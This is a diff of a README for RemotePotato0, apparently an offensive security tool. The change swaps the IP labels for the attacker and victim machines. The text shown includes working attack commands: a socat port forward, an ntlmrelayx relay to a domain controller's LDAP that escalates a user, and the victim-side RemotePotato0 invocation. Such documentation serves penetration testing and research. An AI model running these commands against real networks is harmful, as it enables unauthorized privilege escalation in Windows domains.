@@ -13,14 +13,14 @@ Full details at --> https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-
 
 ## Example
 
-Attacker machine (10.0.0.11):
+Attacker machine (10.0.0.20):
 
 ```
 sudo socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.11:1111 &
 sudo ntlmrelayx.py -t ldap://10.0.0.10 --escalate-user winrm_user --no-wcf-server
 ```
 
-Victim machine (10.0.0.20):
+Victim machine (10.0.0.11):
 
 ```
 .\RemotePotato0.exe -r 10.0.0.20 -p 1111
